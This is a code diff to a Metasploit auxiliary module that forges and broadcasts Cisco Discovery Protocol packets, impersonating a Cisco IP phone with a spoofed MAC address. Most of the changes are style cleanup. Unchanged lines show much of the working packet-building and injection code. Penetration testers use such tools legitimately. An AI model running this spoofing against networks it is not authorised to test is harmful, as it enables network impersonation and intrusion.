@@ -7,38 +7,43 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Capture
 
   def initialize
-
     super(
-      'Name'        => 'Send Cisco Discovery Protocol (CDP) Packets',
+      'Name' => 'Send Cisco Discovery Protocol (CDP) Packets',
       'Description' => %q{
         This module sends Cisco Discovery Protocol (CDP) packets. Note that any responses
         to the CDP packets broadcast from this module will need to be analyzed with an
         external packet analysis tool, such as tcpdump or Wireshark in order to learn more
         about the Cisco switch and router environment.
       },
-      'Author'      => 'Fatih Ozavci', # viproy.com/fozavci
-      'License'     =>  MSF_LICENSE,
-      'References'  => [
+      'Author' => 'Fatih Ozavci', # viproy.com/fozavci
+      'License' => MSF_LICENSE,
+      'References' => [
         [ 'URL', 'https://en.wikipedia.org/wiki/CDP_Spoofing' ]
       ],
-      'Actions'     => [
+      'Actions' => [
         ['Spoof', { 'Description' => 'Sends CDP packets' }]
       ],
-      'DefaultAction' => 'Spoof'
+      'DefaultAction' => 'Spoof',
+      'Notes' => {
+        'Stability' => [OS_RESOURCE_LOSS],
+        'SideEffects' => [IOC_IN_LOGS],
+        'Reliability' => []
+      }
     )
 
     register_options(
       [
-        OptString.new('SMAC', [false, "MAC Address for MAC Spoofing"]),
-        OptString.new('VTPDOMAIN', [false, "VTP Domain"]),
-        OptString.new('DEVICE_ID', [true, "Device ID (e.g. SIP00070EEA3156)", "SEP00070EEA3156"]),
-        OptString.new('PORT', [true, "The CDP 'sent through interface' value", "Port 1"]),
+        OptString.new('SMAC', [false, 'MAC address for MAC spoofing']),
+        OptString.new('VTPDOMAIN', [false, 'VTP Domain']),
+        OptString.new('DEVICE_ID', [true, 'Device ID (e.g. SIP00070EEA3156)', 'SEP00070EEA3156']),
+        OptString.new('PORT', [true, "The CDP 'sent through interface' value", 'Port 1']),
         # XXX: this is not currently implemented
-        #OptString.new('CAPABILITIES',   [false, "Capabilities of the device (e.g. Router, Host, Switch)", "Router"]),
-        OptString.new('PLATFORM', [true, "Platform of the device", "Cisco IP Phone 7975"]),
-        OptString.new('SOFTWARE', [true, "Software of the device", "SCCP75.9-3-1SR2-1S"]),
+        # OptString.new('CAPABILITIES',   [false, "Capabilities of the device (e.g. Router, Host, Switch)", "Router"]),
+        OptString.new('PLATFORM', [true, 'Platform of the device', 'Cisco IP Phone 7975']),
+        OptString.new('SOFTWARE', [true, 'Software of the device', 'SCCP75.9-3-1SR2-1S']),
         OptBool.new('FULL_DUPLEX', [true, 'True iff full-duplex, false otherwise', true])
-      ])
+      ]
+    )
 
     deregister_options('FILTER', 'PCAPFILE', 'RHOST', 'SNAPLEN', 'TIMEOUT')
   end
@@ -46,8 +51,9 @@ class MetasploitModule < Msf::Auxiliary
   def setup
     check_pcaprub_loaded
     unless smac
-      fail ArgumentError, "Unable to get SMAC from #{interface} -- Set INTERFACE or SMAC"
+      raise ArgumentError, "Unable to get SMAC from #{interface} -- Set INTERFACE or SMAC"
     end
+
     open_pcap
     close_pcap
   end
@@ -61,19 +67,17 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    begin
-      open_pcap
+    open_pcap
 
-      @run = true
-      cdp_packet = build_cdp
-      print_status("Sending CDP messages on #{interface}")
-      while @run
-        capture.inject(cdp_packet)
-        Rex.sleep(60)
-      end
-    ensure
-      close_pcap
+    @run = true
+    cdp_packet = build_cdp
+    print_status("Sending CDP messages on #{interface}")
+    while @run
+      capture.inject(cdp_packet)
+      Rex.sleep(60)
     end
+  ensure
+    close_pcap
   end
 
   def build_cdp
@@ -106,7 +110,7 @@ class MetasploitModule < Msf::Auxiliary
     # VTP management domain
     cdp << tlv(9, datastore['VTPDOMAIN']) if datastore['VTPDOMAIN']
     # random 1000-7000 power consumption in mW
-    cdp << tlv(0x10, [1000 + rand(6000)].pack('n'))
+    cdp << tlv(0x10, [rand(1000..6999)].pack('n'))
     # duplex
     cdp << tlv(0x0b, datastore['FULL_DUPLEX'] ? "\x01" : "\x00")
     # VLAn query.  TODO: figure out this field, use tlv, make configurable
@@ -117,7 +121,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # Build and return the final packet, which is 802.3 + LLC + CDP.
     # 802.3
-    PacketFu::EthHeader.mac2str("01:00:0C:CC:CC:CC") +
+    PacketFu::EthHeader.mac2str('01:00:0C:CC:CC:CC') +
       PacketFu::EthHeader.mac2str(smac) +
       [cdp.length + 8].pack('n') +
       # LLC
@@ -126,8 +130,8 @@ class MetasploitModule < Msf::Auxiliary
       cdp
   end
 
-  def tlv(t, v)
-    [ t, v.length + 4 ].pack("nn") + v
+  def tlv(type, value)
+    [ type, value.length + 4 ].pack('nn') + value
   end
 
   def compute_cdp_checksum(cdp)
@@ -143,6 +147,6 @@ class MetasploitModule < Msf::Auxiliary
     checksum += cdp[cdp.length - 1].getbyte(0) << 8 if remaining == 1
     checksum = (checksum >> 16) + (checksum & 0xffff)
     checksum = ~((checksum >> 16) + checksum) & 0xffff
-    ([checksum].pack("S*")).unpack("n*")[0]
+    [checksum].pack('S*').unpack('n*')[0]
   end
 end
